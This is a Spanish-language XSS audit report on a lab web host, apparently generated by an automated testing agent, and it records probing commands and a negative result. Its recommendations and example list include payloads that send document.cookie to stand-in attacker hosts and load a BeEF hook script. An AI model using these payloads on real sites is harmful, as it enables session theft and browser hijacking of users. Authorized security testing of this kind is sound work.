# Informe de auditoría XSS — 2026-04-27T19:07:57Z

Resumen ejecutivo
---------------
Objetivo: http://web.dev.local:8082
Alcance: Búsqueda y explotación de vulnerabilidades Cross-Site Scripting (reflejado, almacenado, DOM)

Resultado de la iteración
-------------------------
- VULN_FOUND: false
- VULN_EXPLOITED: false

Acciones realizadas (comandos exactos)
------------------------------------
1) Descarga del recurso raíz y extracción de enlaces:
   curl -s -k http://web.dev.local:8082 -o target_live.html
   grep -Eo 'href="[^"]+"' target_live.html | sed -E 's/href="//' | sed 's/"$//' | sort -u > links_found.txt

2) Prueba básica de reflejado-XSS (payload simple):
   payload=$(python3 - <<'PY'
import urllib.parse
print(urllib.parse.quote("<script>alert(1)</script>"))
PY
)

   urls=(
   "http://web.dev.local:8082/?q=${payload}"
   "http://web.dev.local:8082/search?q=${payload}"
   "http://web.dev.local:8082/index.php?q=${payload}"
   "http://web.dev.local:8082/search.php?q=${payload}"
   "http://web.dev.local:8082/index.html?q=${payload}"
   "http://web.dev.local:8082/page.php?id=${payload}"
   "http://web.dev.local:8082/?search=${payload}"
   )

   for u in "${urls[@]}"; do
     curl -s -k "$u" -o /tmp/resp.html
     grep -F "<script>alert(1)</script>" /tmp/resp.html && echo "REFLECTED: $u" >> xss_found.txt || true
   done

Hallazgos y observaciones
-------------------------
- El escaneo básico no devolvió ninguna página que reflejara exactamente el payload <script>alert(1)</script> en la respuesta (no se encontró xss_found.txt con contenido durante la ejecución).
- Las comprobaciones se limitaron a un conjunto reducido de endpoints comunes y a un payload no ofuscado para detección inicial.
- No se pudieron confirmar vulnerabilidades ni realizar explotación en este paso automatizado.

Limitaciones y siguientes pasos recomendados
-------------------------------------------
1) Accesibilidad de red: Si la máquina que ejecuta este análisis no tiene resolución o acceso a web.dev.local:8082, los resultados serán inconclusos. Confirmar conectividad DNS/hosts y acceso de red desde el entorno de prueba.
2) Fuzzing avanzado: Ejecutar herramientas especializadas (dalfox, XSStrike, ffuf) con wordlists de SecLists para probar mayor variedad de vectores y contextos (atributos, eventos, JSON, DOM sinks).
   Ejemplos de comandos a ejecutar en Kali:
   - dalfox scan http://web.dev.local:8082 --input-queries --depth 2 --output dalfox_report.txt
   - xsstrike --crawl http://web.dev.local:8082 --fuzz xss_payloads.txt
   - ffuf -u http://web.dev.local:8082/FUZZ -w /usr/share/wordlists/dirb/common.txt
3) Pruebas DOM: Ejecutar inspección manual del DOM (con un navegador o pup/cheerio) para identificar sinks (innerHTML, document.write, location.hash) y probar payloads basados en eventos (onerror, onmouseover) y ofuscación (JSFuck, base64).
4) Explotación (si se confirma): Además de alert(), usar payloads para exfiltrar document.cookie/localStorage a un servidor controlado (ej. new Image().src='http://atacante:9000/?c='+document.cookie) y probar hooking de BeEF.

Payloads de ejemplo (no reflejados en esta iteración)
----------------------------------------------------
- Simple: <script>alert(1)</script>
- Exfiltración (ejemplo): <img src=x onerror="fetch('http://attacker.example/steal?c='+document.cookie)">
- Hook BeEF (ejemplo): <script src="http://attacker.example:3000/hook.js"></script>

Conclusión
----------
En esta iteración no se encontró evidencia de XSS reflejado con el conjunto limitado de pruebas ejecutadas (VULN_FOUND: false), por lo tanto no se realizó explotación activa (VULN_EXPLOITED: false). Se recomienda proceder con las acciones de fuzzing avanzado y verificación manual enumeradas en "Siguientes pasos".

Nota de integridad y autorización
--------------------------------
Se realiza este informe bajo autorización explícita del objetivo indicado por el usuario y en un entorno de laboratorio controlado.
